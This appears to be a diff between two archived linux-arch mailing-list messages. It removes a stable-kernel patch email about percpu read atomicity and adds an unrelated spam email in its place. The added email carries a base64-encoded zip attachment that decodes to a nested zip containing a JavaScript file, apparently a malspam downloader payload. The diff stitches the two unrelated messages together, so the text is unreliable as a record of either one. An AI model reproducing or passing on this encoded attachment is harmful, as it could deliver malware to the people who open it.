@@ -1,92 +1,68 @@
-From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
-Subject: [PATCH 4.13 112/160] percpu: make this_cpu_generic_read() atomic w.r.t. interrupts
-Date: Tue, 10 Oct 2017 21:50:40 +0200
-Message-ID: <20171010190553.163114031@linuxfoundation.org>
-References: <20171010190548.690912997@linuxfoundation.org>
+From: <sherrilyn@oceansfleet.com>
+Subject: (unknown)
+Date: Wed, 11 Oct 2017 08:20:46 -0000
+Message-ID: <150771004664.32758.8650734684564677355@dynamic.mm.pl>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20171010190548.690912997@linuxfoundation.org>
-Sender: linux-kernel-owner@vger.kernel.org
-To: linux-kernel@vger.kernel.org
-Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>, stable@vger.kernel.org, Mark Rutland <mark.rutland@arm.com>, Arnd Bergmann <arnd@arndb.de>, Christoph Lameter <cl@linux.com>, Peter Zijlstra <peterz@infradead.org>, Pranith Kumar <bobby.prani@gmail.com>, Tejun Heo <tj@kernel.org>, Thomas Gleixner <tglx@linutronix.de>, linux-arch@vger.kernel.org
-List-Id: linux-arch.vger.kernel.org
+Content-Type: application/zip; name="00401005801.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-arch-owner@vger.kernel.org>
+Received: from host-89-231-13-28.dynamic.mm.pl ([89.231.13.28]:37498 "HELO
+        dynamic.mm.pl" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751415AbdJKIUs (ORCPT <rfc822;linux-arch@vger.kernel.org>);
+        Wed, 11 Oct 2017 04:20:48 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-arch-owner@vger.kernel.org
+List-ID: <linux-arch.vger.kernel.org>
+To: linux-arch@vger.kernel.org
 
-4.13-stable review patch.  If anyone has any objections, please let me know.
-
-------------------
-
-From: Mark Rutland <mark.rutland@arm.com>
-
-commit e88d62cd4b2f0b1ae55e9008e79c2794b1fc914d upstream.
-
-As raw_cpu_generic_read() is a plain read from a raw_cpu_ptr() address,
-it's possible (albeit unlikely) that the compiler will split the access
-across multiple instructions.
-
-In this_cpu_generic_read() we disable preemption but not interrupts
-before calling raw_cpu_generic_read(). Thus, an interrupt could be taken
-in the middle of the split load instructions. If a this_cpu_write() or
-RMW this_cpu_*() op is made to the same variable in the interrupt
-handling path, this_cpu_read() will return a torn value.
-
-For native word types, we can avoid tearing using READ_ONCE(), but this
-won't work in all cases (e.g. 64-bit types on most 32-bit platforms).
-This patch reworks this_cpu_generic_read() to use READ_ONCE() where
-possible, otherwise falling back to disabling interrupts.
-
-Signed-off-by: Mark Rutland <mark.rutland@arm.com>
-Cc: Arnd Bergmann <arnd@arndb.de>
-Cc: Christoph Lameter <cl@linux.com>
-Cc: Peter Zijlstra <peterz@infradead.org>
-Cc: Pranith Kumar <bobby.prani@gmail.com>
-Cc: Tejun Heo <tj@kernel.org>
-Cc: Thomas Gleixner <tglx@linutronix.de>
-Cc: linux-arch@vger.kernel.org
-Signed-off-by: Tejun Heo <tj@kernel.org>
-Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
-
----
- include/asm-generic/percpu.h |   24 ++++++++++++++++++++++--
- 1 file changed, 22 insertions(+), 2 deletions(-)
-
---- a/include/asm-generic/percpu.h
-+++ b/include/asm-generic/percpu.h
-@@ -115,15 +115,35 @@ do {									\
- 	(__ret);							\
- })
- 
--#define this_cpu_generic_read(pcp)					\
-+#define __this_cpu_generic_read_nopreempt(pcp)				\
- ({									\
- 	typeof(pcp) __ret;						\
- 	preempt_disable_notrace();					\
--	__ret = raw_cpu_generic_read(pcp);				\
-+	__ret = READ_ONCE(*raw_cpu_ptr(&(pcp)));			\
- 	preempt_enable_notrace();					\
- 	__ret;								\
- })
- 
-+#define __this_cpu_generic_read_noirq(pcp)				\
-+({									\
-+	typeof(pcp) __ret;						\
-+	unsigned long __flags;						\
-+	raw_local_irq_save(__flags);					\
-+	__ret = raw_cpu_generic_read(pcp);				\
-+	raw_local_irq_restore(__flags);					\
-+	__ret;								\
-+})
-+
-+#define this_cpu_generic_read(pcp)					\
-+({									\
-+	typeof(pcp) __ret;						\
-+	if (__native_word(pcp))						\
-+		__ret = __this_cpu_generic_read_nopreempt(pcp);		\
-+	else								\
-+		__ret = __this_cpu_generic_read_noirq(pcp);		\
-+	__ret;								\
-+})
-+
- #define this_cpu_generic_to_op(pcp, val, op)				\
- do {									\
- 	unsigned long __flags;						\
+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
+fwoAAAAA
